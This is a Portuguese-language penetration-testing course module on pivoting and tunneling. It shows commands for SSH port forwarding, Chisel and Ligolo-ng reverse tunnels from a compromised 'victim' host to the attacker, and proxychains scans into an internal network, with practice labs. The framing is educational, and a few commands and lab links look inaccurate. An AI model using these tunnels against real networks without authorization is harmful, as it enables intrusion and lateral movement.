# Pivoting e Tunneling

> Manter acesso e movimentar-se pela rede após exploração inicial.

---

## O que é Pivoting

Pivoting é usar uma máquina comprometida como ponto de acesso para alcançar outras redes ou máquinas que não estão diretamente acessíveis.

**Exemplo real:** Você comprometeu um servidor web na DMZ. Atrás dele existe uma rede interna (10.0.0.0/24) que você não consegue acessar diretamente. Usando pivoting, você cria um túnel através do servidor web para alcançar essa rede interna.

## Quando usar Pivoting

- Máquina comprometida está em uma rede diferente do alvo
- Firewalls bloqueiam acesso direto à rede interna
- Precisa acessar serviços internos (SMB, RDP, SSH)
- Movimentação lateral em ambientes corporativos

## Fluxo típico

```
1. Comprometer máquina inicial (entry point)
        ↓
2. Coletar informações da rede (ip a, route, arp)
        ↓
3. Configurar túnel até a rede interna
        ↓
4. Usar proxychains para acessar serviços internos
        ↓
5. Explorar máquinas na rede interna
```

---

## Instalação das Ferramentas

```bash
# Chisel (tunneling via HTTP)
go install github.com/jpillora/chisel@latest

# Ligolo-ng (tunneling sem SOCKS)
# Download: https://github.com/nicocha30/ligolo-ng/releases

# proxychains4 (forçar apps a usar proxy)
sudo apt install -y proxychains4
```

---

## SSH Tunneling

A forma mais simples de pivoting - usa SSH que já existe no sistema.

### Local Port Forwarding
```bash
# Redirecionar porta local para um serviço remoto
ssh -L 8080:10.0.0.5:80 user@192.168.1.100

# Agora acesse http://localhost:8080 → chega em 10.0.0.5:80
```

**Quando usar:** Precisa acessar um serviço interno a partir da sua máquina.

### Remote Port Forwarding
```bash
# Criar porta no servidor remoto que redireciona para sua máquina
ssh -R 9090:localhost:8080 user@192.168.1.100

# Agora quem acessar 192.168.1.100:9090 chega em seu localhost:8080
```

**Quando usar:** Precisa expor um serviço da sua máquina para a rede do alvo.

### Dynamic Port Forwarding (SOCKS Proxy)
```bash
# Criar proxy SOCKS que redireciona tudo através do túnel
ssh -D 1080 user@192.168.1.100

# Configurar proxychains para usar:
# socks5 127.0.0.1 1080

# Agora qualquer ferramenta pode acessar a rede interna:
proxychains4 nmap -sV -Pn 10.0.0.0/24
proxychains4 curl http://10.0.0.5
```

**Quando usar:** Precisa acessar múltiplos serviços na rede interna.

### Exemplo completo
```bash
# 1. Conectar na máquina comprometida
ssh user@192.168.1.100

# 2. Na máquina comprometida, descobrir redes
ip a
#eth0: 192.168.1.100/24
#eth1: 10.0.0.5/24  ← rede interna

# 3. Na sua máquina, criar túnel
ssh -D 1080 user@192.168.1.100

# 4. Configurar proxychains
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf

# 5. Acessar rede interna
proxychains4 nmap -sV -Pn 10.0.0.0/24
```

---

## Chisel

Tunneling via HTTP/HTTPS. Útil quando SSH está bloqueado.

### Instalação
```bash
# No atacante (.listener):
go install github.com/jpillora/chisel@latest

# Na vítima (client) - baixar binário:
# https://github.com/jpillora/chisel/releases
```

### Uso básico

#### Atacante (Servidor)
```bash
# Iniciar servidor SOCKS na porta 8080
chisel server --reverse --port 8080

# Output:
# 2024/01/01 10:00:00 server: Listening on :8080
```

#### Vítima (Cliente)
```bash
# Conectar no servidor e criar proxy SOCKS
chisel client 192.168.1.100:8080 127.0.0.1:1080:socks

# Agora configure proxychains:
# socks5 127.0.0.1 1080
```

### Exemplo avançado
```bash
# Port forwarding específico
chisel client 192.168.1.100:8080 R:3389:10.0.0.5:3389
# Agora localhost:3389 → 10.0.0.5:3389 (RDP)

# Múltiplos túneis
chisel client 192.168.1.100:8080 R:3389:10.0.0.5:3389 R:445:10.0.0.5:445
```

---

## Ligolo-ng

Tunneling sem necessidade de SOCKS. Mais rápido que Chisel.

### Instalação
```bash
# Download: https://github.com/nicocha30/ligolo-ng/releases
# Baixar: proxy (para atacante) e agent (para vítima)
```

### Uso básico

#### Atacante (Proxy)
```bash
# Iniciar proxy
sudo ./proxy -selfcert -laddr 0.0.0.0:11601

# Criar interface tun
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
```

#### Vítima (Agent)
```bash
# Conectar no proxy
./agent -connect 192.168.1.100:11601 -ignore-cert

# No proxy (interativo):
>> session
>> start
>> ifconfig
# Obter IP da rede interna (ex: 10.0.0.5)

# Adicionar rota
>> sudo ip route add 10.0.0.0/24 dev ligolo

# Agora pode acessar 10.0.0.0/24 diretamente!
```

---

## Proxychains

Força qualquer aplicação a usar o túnel SOCKS.

### Configuração
```bash
# Editar /etc/proxychains4.conf
# Trocar para:
dynamic_chain
proxy_list
socks5 127.0.0.1 1080
```

### Uso
```bash
# Nmap via proxychains
proxychains4 nmap -sV -Pn 10.0.0.0/24

# Curl via proxychains
proxychains4 curl http://10.0.0.5

# SSH via proxychains
proxychains4 ssh user@10.0.0.5

# RDP via proxychains
proxychains4 xfreerdp /v:10.0.0.5 /u:admin
```

---

## Erros Comuns

1. **Esquecer de adicionar rota** — sem rota, o tráfego não vai para a rede interna
2. **Não verificar redes** — sempre rode `ip a` e `route -n` na máquina comprometida
3. **Usar T4 com proxychains** — é muito lento, use T2
4. **Não testar conectividade** — sempre teste com `ping` ou `curl` antes de escanear

---

## Lab Prático

### Exercício 1: Pivot básico com SSH
- **Plataforma:** TryHackMe
- **Link:** https://tryhackme.com/room/dvwa
- **O que vai praticar:** SSH tunneling, proxychains, nmap via túnel
- **Tempo estimado:** 30 min

### Exercício 2: Pivoting com Chisel
- **Plataforma:** HackTheBox
- **Link:** https://app.hackthebox.com/rooms/ignite
- **O que vai praticar:** Chisel, port forwarding, acesso a rede interna
- **Tempo estimado:** 45 min

### Dica de Estudo
> Pratique em máquinas fáceis do TryHackMe primeiro. Tente acessar serviços internos usando apenas SSH tunneling antes de usar Chisel ou Ligolo-ng.

---

**Anterior:** [Módulo 4: Exploração](../04-exploracao/)
**Próximo:** [Módulo 6: Engenharia Reversa](../06-reversing/)
